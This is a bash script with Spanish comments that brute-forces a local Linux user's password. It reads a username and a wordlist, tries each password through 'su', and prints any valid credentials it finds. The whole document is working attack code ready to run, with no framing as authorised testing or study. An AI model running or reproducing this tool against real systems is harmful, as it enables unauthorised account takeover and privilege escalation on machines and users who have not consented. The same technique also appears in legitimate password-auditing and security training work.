#!/bin/bash

# Función de ayuda
usage() {
    echo "Uso: $0 -u <usuario> -w <diccionario>"
    exit 1
}

# Procesar argumentos
while getopts ":u:w:" opt; do
    case $opt in
        u) USER=$OPTARG ;;
        w) WORDLIST=$OPTARG ;;
        *) usage ;;
    esac
done

# Verificar que los argumentos no estén vacíos
if [ -z "$USER" ] || [ -z "$WORDLIST" ]; then
    usage
fi

# Verificar que el archivo de diccionario exista
if [ ! -f "$WORDLIST" ]; then
    echo "[!] El archivo de diccionario no existe: $WORDLIST"
    exit 1
fi

# Comenzar el ataque de fuerza bruta
echo "[*] Iniciando ataque de fuerza bruta sobre el usuario: $USER con el diccionario: $WORDLIST"

while read -r PASS; do
    echo "[*] Intentando $USER:$PASS"
    
    echo "$PASS" | su - "$USER" -c "exit" &>/dev/null

    if [ $? -eq 0 ]; then
        echo "[+] ¡Credenciales válidas encontradas! $USER:$PASS"
        break
    fi
done < "$WORDLIST"

echo "[*] Finalizado."
